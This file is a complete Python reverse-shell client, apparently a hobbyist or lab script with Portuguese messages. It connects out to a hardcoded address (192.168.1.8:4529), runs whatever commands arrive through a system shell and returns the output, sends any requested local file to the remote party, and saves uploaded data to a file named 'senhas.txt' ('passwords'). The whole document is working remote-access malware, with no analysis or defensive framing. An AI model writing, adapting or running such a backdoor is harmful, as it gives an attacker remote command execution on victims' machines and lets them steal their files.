import socket
import subprocess
import os

def reverse_tcp(ip,port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))

    while True:
        comand = s.recv(1024)
        if 'download' in comand:
            comand, path = comand.split('-')
            send_file(s,path)
            continue
        if 'upload' in comand:
            print('cliente se aprontando para receber arquivo')
            recv_file(s)
            continue
        else:
            Wshel = subprocess.Popen(comand,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(Wshel.stdout.read())
            s.send(Wshel.stderr.read())


def send_file(conexao, path):
    if os.path.exists(path):
        f = open(path,'rb')
        data = f.read(1024)
        while data !='':
            conexao.send(data)
            data = f.read(1024)
        conexao.send('done')
        f.close()
    else:
        conexao.send('unable to find data')

def recv_file(conexao):
    f = open('senhas.txt','wb')
    while True:
        data = conexao.recv(1024)
        if 'done' in data:
            f.close()
            break
        print(data)
        f.write(data)

reverse_tcp('192.168.1.8',4529)
